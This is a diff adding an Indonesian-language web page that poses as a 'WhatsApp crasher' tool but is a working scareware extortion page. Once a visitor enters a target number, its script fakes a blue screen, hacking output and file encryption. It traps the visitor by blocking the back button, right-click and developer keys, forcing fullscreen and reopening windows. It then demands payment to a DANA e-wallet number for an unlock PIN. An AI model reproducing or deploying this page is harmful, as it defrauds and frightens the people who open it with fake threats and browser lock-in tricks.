@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BUG WHATSAPP NARUTO CRASER</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #121212;
+            color: white;
+            text-align: center;
+            transition: all 0.5s;
+            overflow: hidden;
+        }
+        
+        .page {
+            display: none;
+            padding: 20px;
+            max-width: 500px;
+            margin: 0 auto;
+            height: 100vh;
+            box-sizing: border-box;
+        }
+        
+        .active-page {
+            display: block;
+        }
+        
+        h1 {
+            color: #ff5722;
+            text-shadow: 0 0 10px rgba(255, 87, 34, 0.5);
+        }
+        
+        .naruto-img {
+            width: 150px;
+            margin: 20px 0;
+            animation: pulse 1s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        input, select, button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: none;
+            font-size: 16px;
+        }
+        
+        button {
+            background-color: #ff5722;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        button:hover {
+            background-color: #e64a19;
+        }
+        
+        .warning {
+            color: #ff9800;
+            font-size: 14px;
+            margin-top: 30px;
+        }
+        
+        .locked-page {
+            background-color: #b71c1c;
+            padding: 20px;
+            border-radius: 10px;
+            animation: shake 0.5s;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+        
+        .bsod {
+            background: #0078d7;
+            color: white;
+            padding: 20px;
+            height: 100vh;
+            font-family: Consolas, monospace;
+        }
+        
+        .hacker-screen {
+            background: black;
+            color: #0f0;
+            padding: 20px;
+            font-family: monospace;
+            height: 100vh;
+            text-align: left;
+            overflow: auto;
+        }
+        
+        .blink {
+            animation: blink 0.5s step-end infinite;
+        }
+        
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+        
+        #redirectPage {
+            background-color: #000;
+            border: 5px solid red;
+        }
+        
+        #warningSound {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Audio untuk efek suara -->
+    <audio id="warningSound" loop>
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-alarm-digital-clock-beep-989.mp3" type="audio/mpeg">
+    </audio>
+
+    <!-- Halaman Pertama -->
+    <div id="page1" class="page active-page">
+        <h1>BUG WHATSAPP NARUTO CRASER</h1>
+        <img src="https://i.imgur.com/JR9nHZP.png" alt="Naruto" class="naruto-img">
+        <p>Tools eksklusif untuk crash WhatsApp target</p>
+        <button onclick="nextPage()">START</button>
+        <p class="warning">Gunakan dengan bijak! Kami tidak bertanggung jawab atas penyalahgunaan</p>
+    </div>
+    
+    <!-- Halaman Kedua -->
+    <div id="page2" class="page">
+        <h1>WELCOME TO NEW USER</h1>
+        <p>silahkan pilih metode di bawah</p>
+        
+        <input type="text" id="targetNumber" placeholder="MASUKAN NOMOR TARGET">
+        
+        <select id="method">
+            <option value="">PILIH METODE</option>
+            <option value="crash">CRASH</option>
+            <option value="blank">BLANK UI</option>
+            <option value="error">SISTEM ERROR</option>
+        </select>
+        
+        <button onclick="executeMethod()">EKSEKUSI</button>
+    </div>
+    
+    <!-- Halaman Ketiga -->
+    <div id="page3" class="page">
+        <div class="locked-page">
+            <h1>PERANGKAT INI TELAH DI KUNCI</h1>
+            <p class="blink">MAKANYA DECK JANGAN ASAL CLICK LINK</p>
+            <p>TRANSFER KE DANA 083862297405</p>
+            <p>JIKA INGIN KELUAR</p>
+            
+            <input type="password" id="pinInput" placeholder="MASUKAN PIN KELUAR ANDA">
+            <button onclick="checkPin()">UNLOCK</button>
+        </div>
+    </div>
+    
+    <!-- Halaman BSOD -->
+    <div id="bsod" class="page bsod">
+        <h1>:(</h1>
+        <p style="font-size:18px;">Your device ran into a problem and needs to restart.</p>
+        <p id="bsodProgress">0% complete</p>
+        <p>Call service center: 083862297405 (DANA Only)</p>
+    </div>
+    
+    <!-- Halaman Hacker -->
+    <div id="hacker" class="page hacker-screen">
+        <!-- Konten akan diisi oleh JavaScript -->
+    </div>
+    
+    <!-- Halaman Redirect -->
+    <div id="redirectPage" class="page">
+        <h1>⚠️ ILLEGAL ESCAPE ATTEMPT ⚠️</h1>
+        <p class="blink">DETECTED: You tried to leave!</p>
+        <p>Your files are being encrypted...</p>
+        <p>Transfer to DANA 083862297405 to stop</p>
+    </div>
+
+    <script>
+        // Variabel global
+        let escapeAttempts = 0;
+        let redirectTimer;
+        let warningSound;
+        let newWindow = null;
+        let isLocked = false;
+        
+        // Inisialisasi saat halaman dimuat
+        window.onload = function() {
+            warningSound = document.getElementById('warningSound');
+            
+            // Blokir tombol back browser
+            history.pushState(null, null, document.title);
+            window.addEventListener('popstate', function(event) {
+                history.pushState(null, null, document.title);
+                handleEscapeAttempt();
+            });
+
+            // Blokir F12, Ctrl+Shift+I, Ctrl+Shift+J, dll.
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+                    (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+                    (e.ctrlKey && e.key === 'U') ||
+                    e.key === 'Escape') {
+                    e.preventDefault();
+                    handleEscapeAttempt();
+                }
+            });
+
+            // Blokir klik kanan
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                handleEscapeAttempt();
+            });
+        };
+        
+        // Fungsi untuk membuka window baru
+        function openNewWindow() {
+            if(isLocked) return;
+            
+            // Jika sudah ada window, fokuskan ke sana
+            if(newWindow && !newWindow.closed) {
+                newWindow.focus();
+                return;
+            }
+            
+            // Buka window baru dengan halaman yang sama
+            newWindow = window.open(window.location.href, '_blank', 
+                'width=500,height=600,scrollbars=no,resizable=no');
+            
+            // Jika pop-up diblokir, coba lagi setelah 1 detik
+            if(!newWindow || newWindow.closed) {
+                setTimeout(openNewWindow, 1000);
+            }
+        }
+
+        // Fungsi navigasi halaman
+        function nextPage() {
+            document.getElementById('page1').classList.remove('active-page');
+            document.getElementById('page2').classList.add('active-page');
+        }
+        
+        function executeMethod() {
+            const targetNumber = document.getElementById('targetNumber').value;
+            const method = document.getElementById('method').value;
+            
+            if (!targetNumber || !method) {
+                alert('Harap isi nomor target dan pilih metode!');
+                return;
+            }
+            
+            isLocked = true;
+            
+            // Sembunyikan semua halaman
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active-page');
+            });
+            
+            // Mainkan suara peringatan
+            playWarningSound();
+            
+            // Aktifkan fullscreen
+            requestFullscreen();
+            
+            // Tampilkan efek berdasarkan metode
+            if (method === 'crash') {
+                showBSOD();
+            } else if (method === 'blank') {
+                document.getElementById('page3').classList.add('active-page');
+            } else if (method === 'error') {
+                hackerEffect();
+            }
+            
+            // Aktifkan monitoring
+            startMonitoring();
+        }
+        
+        // Fungsi efek khusus
+        function showBSOD() {
+            document.getElementById('bsod').classList.add('active-page');
+            
+            // Efek loading palsu
+            let percent = 0;
+            const progressElement = document.getElementById('bsodProgress');
+            const timer = setInterval(() => {
+                percent += Math.random() * 10;
+                if (percent >= 100) {
+                    clearInterval(timer);
+                    progressElement.textContent = "ERROR: Could not complete operation";
+                    
+                    // Tambahkan pesan transfer
+                    const bsod = document.getElementById('bsod');
+                    const transferMsg = document.createElement('p');
+                    transferMsg.textContent = "Please transfer to DANA 083862297405 to fix";
+                    bsod.appendChild(transferMsg);
+                } else {
+                    progressElement.textContent = Math.min(percent, 99) + "% complete";
+                }
+            }, 500);
+        }
+        
+        function hackerEffect() {
+            document.getElementById('hacker').classList.add('active-page');
+            const hackerScreen = document.getElementById('hacker');
+            
+            const texts = [
+                "INITIALIZING NARUTO CRASHER V3.0...",
+                "CONNECTING TO WHATSAPP SERVERS...",
+                "TARGET ACQUIRED: " + document.getElementById('targetNumber').value,
+                "INJECTING MALICIOUS CODE...",
+                "ERROR! PAYMENT REQUIRED TO CONTINUE",
+                "PLEASE TRANSFER TO DANA 083862297405"
+            ];
+            
+            let i = 0;
+            hackerScreen.innerHTML = '';
+            
+            function typeWriter(text, cb) {
+                let j = 0;
+                const interval = setInterval(() => {
+                    if (j < text.length) {
+                        hackerScreen.innerHTML += text.charAt(j);
+                        j++;
+                        
+                        // Scroll otomatis ke bawah
+                        hackerScreen.scrollTop = hackerScreen.scrollHeight;
+                    } else {
+                        clearInterval(interval);
+                        setTimeout(cb, 1000);
+                    }
+                }, 50);
+            }
+            
+            function next() {
+                if (i < texts.length) {
+                    hackerScreen.innerHTML += '> ';
+                    typeWriter(texts[i], next);
+                    i++;
+                } else {
+                    hackerScreen.innerHTML += '\n\n$ ';
+                    
+                    // Tambahkan efek kedip-kedip
+                    setInterval(() => {
+                        hackerScreen.style.backgroundColor = 
+                            Math.random() > 0.5 ? '#001100' : 'black';
+                    }, 300);
+                }
+            }
+            
+            next();
+        }
+        
+        // Fungsi monitoring real-time
+        function startMonitoring() {
+            // Deteksi ketika pengguna mencoba keluar dari tab
+            document.addEventListener('visibilitychange', () => {
+                if (document.hidden) {
+                    handleEscapeAttempt();
+                }
+            });
+            
+            // Deteksi ketika pengguna mencoba menutup tab
+            window.addEventListener('beforeunload', (e) => {
+                if(isLocked) {
+                    e.preventDefault();
+                    e.returnValue = '';
+                    handleEscapeAttempt();
+                    openNewWindow();
+                }
+            });
+            
+            // Deteksi klik di luar window (jika dalam fullscreen)
+            document.addEventListener('fullscreenchange', () => {
+                if (!document.fullscreenElement && isLocked) {
+                    handleEscapeAttempt();
+                    requestFullscreen();
+                }
+            });
+            
+            // Deteksi ketika window kehilangan fokus
+            window.addEventListener('blur', () => {
+                if(isLocked) {
+                    setTimeout(() => {
+                        if(!document.hasFocus()) {
+                            openNewWindow();
+                        }
+                    }, 500);
+                }
+            });
+        }
+        
+        function handleEscapeAttempt() {
+            if(!isLocked) return;
+            
+            escapeAttempts++;
+            
+            // Mainkan suara peringatan jika belum dimainkan
+            playWarningSound();
+            
+            // Tampilkan halaman redirect
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active-page');
+            });
+            document.getElementById('redirectPage').classList.add('active-page');
+            
+            // Kembalikan ke halaman sebelumnya setelah 3 detik
+            clearTimeout(redirectTimer);
+            redirectTimer = setTimeout(() => {
+                document.getElementById('redirectPage').classList.remove('active-page');
+                
+                // Kembali ke halaman aktif sebelumnya
+                if (document.getElementById('bsod').classList.contains('active-page')) {
+                    document.getElementById('bsod').classList.add('active-page');
+                } else if (document.getElementById('hacker').classList.contains('active-page')) {
+                    document.getElementById('hacker').classList.add('active-page');
+                } else {
+                    document.getElementById('page3').classList.add('active-page');
+                }
+                
+                // Aktifkan fullscreen lagi
+                requestFullscreen();
+                
+                // Tambahkan efek tambahan setelah beberapa percobaan
+                if (escapeAttempts > 2) {
+                    document.body.style.backgroundColor = 'red';
+                    setTimeout(() => {
+                        document.body.style.backgroundColor = '#121212';
+                    }, 1000);
+                    
+                    // Tampilkan pesan ancaman
+                    alert(`⚠️ WARNING: ${escapeAttempts} ESCAPE ATTEMPTS DETECTED!\nYOUR FILES WILL BE DELETED SOON!\nCALL 085273286709 TO STOP!`);
+                }
+            }, 3000);
+        }
+        
+        // Fungsi fullscreen
+        function requestFullscreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(err => {
+                    console.log("Fullscreen error:", err);
+                });
+            }
+        }
+        
+        // Fungsi pemutar suara
+        function playWarningSound() {
+            try {
+                warningSound.currentTime = 0;
+                warningSound.play();
+            } catch (e) {
+                console.log("Error playing sound:", e);
+            }
+        }
+        
+        // Fungsi cek PIN
+        function checkPin() {
+            const pin = document.getElementById('pinInput').value;
+            
+            if (pin === "562719") {
+                // Berhenti memainkan suara
+                warningSound.pause();
+                isLocked = false;
+                
+                // Kembali ke halaman awal
+                document.querySelectorAll('.page').forEach(page => {
+                    page.classList.remove('active-page');
+                });
+                document.getElementById('page1').classList.add('active-page');
+                document.getElementById('pinInput').value = '';
+                
+                // Keluar dari fullscreen
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                }
+                
+                // Reset percobaan keluar
+                escapeAttempts = 0;
+            } else {
+                alert('PIN SALAH! Coba lagi.');
+                document.getElementById('pinInput').value = '';
+                document.getElementById('pinInput').focus();
+                
+                // Tambahkan efek salah
+                document.querySelector('.locked-page').style.backgroundColor = '#ff0000';
+                setTimeout(() => {
+                    document.querySelector('.locked-page').style.backgroundColor = '#b71c1c';
+                }, 500);
+            }
+        }
+    </script>
+</body>
+</html>
